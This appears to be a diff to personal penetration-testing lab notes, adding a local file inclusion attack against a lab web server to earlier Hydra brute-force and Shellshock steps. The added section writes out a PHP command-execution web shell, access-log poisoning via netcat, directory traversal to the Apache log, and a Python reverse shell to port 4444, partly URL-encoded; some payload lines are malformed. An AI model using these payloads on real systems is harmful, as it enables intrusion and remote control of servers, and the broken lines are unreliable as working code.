@@ -1,4 +1,4 @@
-## Attempt 1 Hydra
+## Attempt 1 Hydra (Brute Force)
 
 * Open Kali terminal man hydra read options that can be used with this tool.
 
@@ -36,7 +36,7 @@
 * Burp Suite to view data being sent through the browswer. If you decide to use this ensure to set the proxy of the browser to loop back IP 127.0.0.1
 
 
-## Attempt 2
+## Attempt 2 shellshock reverse shell code
 
 * run dirb https://192.168.20.100 this should return results using common.txt wordlist.
 
@@ -48,6 +48,32 @@
 
 * ls should show results from reverse shell
 
+## Attempt 3 LFI Vulnerability
+
+* LFI - Local File Inclusion
+
+* Redirect parameter is the same as view parameter which loads the new page.
+
+* Attempt to traverse the directory for example ../../../var/log/apache2/access.log
+
+* With payload to execute commands:
+
+      <?php system($_GET['cmd']); >>
+
+* Another payload to send reverse shell in python:
+
+      python -c  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+* Request 1:
+
+      $ nc secureapplication.example 80
+      GET /<?php system($_GET['cmd']);?>
+      
+* Request 2:
+
+      /index.php?view=../../../var/log/apache2/access.log&cmd=python+-c+'import+  socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("192.168.20.100",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b'
+      
+* By listening on port 4444 we can see that a shell has been received.
 
 
 
